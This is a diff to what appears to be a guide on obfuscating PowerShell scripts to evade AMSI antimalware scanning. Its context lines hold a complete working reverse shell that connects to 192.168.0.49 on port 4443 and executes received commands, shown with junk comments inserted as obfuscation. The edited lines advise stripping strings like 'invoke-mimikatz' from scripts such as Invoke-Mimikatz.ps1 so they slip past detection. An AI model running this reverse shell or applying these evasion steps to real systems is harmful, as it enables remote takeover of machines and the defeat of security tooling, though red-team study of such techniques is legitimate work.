@@ -121,9 +121,10 @@ for example, a reverse shell command could be obfuscated like this:
 ```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
 
 ### Removing Comments
-There are malware-ish keywords that will trigger AMSI immediatly and should be replaced when obfuscating scripts. Check this out:
+There are malware-ish strings that will trigger AMSI immediatly and it should be a priority to replace them, when obfuscating scripts. Check this out:  
+![image](https://user-images.githubusercontent.com/75489922/231485178-99aded23-3a7a-46ab-ab30-2a10e5e3a332.png)
 
-Just by typing the word 'mimikatz' in the terminal AMSI is having a stroke. 
-These keywords may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub).  
+Just by typing the string 'invoke-mimikatz' in the terminal AMSI is having a stroke (the script is not even present / loaded). 
+These strings may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub).  
   
 \*It's a good idea to remove comments generally, this was just an example.
